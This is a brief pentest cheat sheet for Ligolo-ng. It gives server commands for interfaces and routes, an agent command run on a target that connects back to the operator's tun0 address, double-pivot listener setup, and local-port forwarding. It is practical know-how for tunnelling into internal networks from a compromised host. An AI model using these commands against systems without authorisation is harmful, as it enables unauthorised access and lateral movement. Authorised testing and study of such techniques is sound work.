## Ligolo
https://docs.ligolo.ng/

### Server side
```bash
# Start ligolo server
sudo ligolo-ng -selfcert
# Create interface
ligolo-ng » ifcreate --name "interface_name"
ligolo-ng » iflist
ligolo-ng » ifdel --name "interface_name"
# Route
ligolo-ng » route_add --name "interface_name" --route network_addr/cidr
ligolo-ng » route_list
ligolo-ng » route_del --name "interface_name" --route network_addr/cidr
# Start pivot
ligolo-ng » start --tun "interface_name"
```

### Client side
```bash
agent.exe -connect tun0:11601 -ignore-cert
./agent -connect tun0:11601 -ignore-cert
```

### Double pivot
https://docs.ligolo.ng/sample/double/
After setup the first pivot, we can set a listenner below, the agent will listen on 4444/tcp
```bash
# Listener on agent 1
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601
ligolo-ng » listener_list
# After 
ligolo-ng » ifcreate --name "interface_name"
ligolo-ng » route_add --name "interface_name" --route network_addr/cidr
ligolo-ng » start --tun "interface_name"
```

### Forwarding local port
```bash
# After received call back brom target
ligolo-ng » ifcreate --name "local"
ligolo-ng » route_add --name "local" --route 240.0.0.1/32
ligolo-ng » start --tun "local"
```